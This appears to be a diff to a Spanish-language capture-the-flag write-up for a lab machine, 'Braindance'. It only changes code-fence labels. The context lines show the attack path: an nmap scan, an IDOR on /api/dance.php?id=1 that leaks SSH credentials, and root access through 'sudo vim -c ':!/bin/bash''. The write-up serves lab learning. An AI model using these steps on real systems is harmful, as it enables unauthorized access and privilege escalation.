@@ -29,7 +29,7 @@ Braindance es una pequeña tienda de "neurodanzas": clips de baile que se cargan
 
 Lo primero, un escaneo de puertos a la ip de la máquina.
 
-```tmux
+```bash
 nmap -sC -sV MACHINE_IP
 ```
 
@@ -57,7 +57,7 @@ Ahora abro bien la petición y veo que se hace la solicitud a `/api/dance.php?id
 
 Cada clip del catálogo tiene su propio id (del 2 al 6, que son los que se ven listados), así que lo lógico es probar si existe algún id que no esté enlazado en la web. Pruebo directamente con el `id=1`.
 
-```tmux
+```bash
 curl http://MACHINE_IP/api/dance.php?id=1
 ```
 
@@ -69,7 +69,7 @@ Y ahí está: el id 1 es un clip que nunca debería haberse publicado, y en el c
 
 Con las credenciales que he sacado de la API, pruebo a conectarme por SSH.
 
-```tmux
+```bash
 ssh braindancer@MACHINE_IP
 ```
 
@@ -77,7 +77,7 @@ ssh braindancer@MACHINE_IP
 
 Entro sin problema. Reviso la carpeta del usuario y ahí está la primera flag.
 
-```tmux
+```bash
 ls
 cat user.txt
 ```
@@ -88,7 +88,7 @@ cat user.txt
 
 Ya dentro, lo primero que miro son los permisos de sudo del usuario.
 
-```tmux
+```bash
 sudo -l
 ```
 
@@ -96,7 +96,7 @@ sudo -l
 
 El usuario puede ejecutar `/usr/bin/vim` como root sin contraseña. Vim es uno de los binarios clásicos de GTFOBins para escalar privilegios: una vez dentro, se puede lanzar una shell directamente desde el propio editor.
 
-```tmux
+```bash
 sudo vim -c ':!/bin/bash'
 ```
 
@@ -112,7 +112,7 @@ Resumidamente lo que hace este comando es lo siguiente:
 
 Y con la shell de root ya puedo leer la segunda flag.
 
-```tmux
+```bash
 cd /root/
 ls
 cat /root/root.txt
